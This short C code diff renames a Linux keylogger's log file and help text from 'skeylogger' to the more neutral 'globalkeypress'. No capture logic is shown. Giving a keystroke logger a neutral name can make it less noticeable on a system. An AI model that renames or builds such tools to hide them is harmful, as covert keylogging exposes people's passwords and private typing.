@@ -50,7 +50,7 @@ static char *getKeyboardDeviceFileName() {
 
 void parseOptions(int argc, char **argv, Config *config) {
    config->deviceFile = getKeyboardDeviceFileName();
-   config->logFile = "/var/log/skeylogger.log";
+   config->logFile = "/var/log/globalkeypress.log";
 
    int index;
    int opt = 0;
@@ -80,7 +80,7 @@ void parseOptions(int argc, char **argv, Config *config) {
 }
 
 static void printHelp() {
-   printf("%s\n", "Usage: skeylogger [OPTION]\n"
+   printf("%s\n", "Usage: globalkeypress [OPTION]\n"
           "Logs pressed keys\n\n"
           "  -h, --help\t\tDisplays this help message\n"
           "  -v, --version\t\tDisplays version information\n"
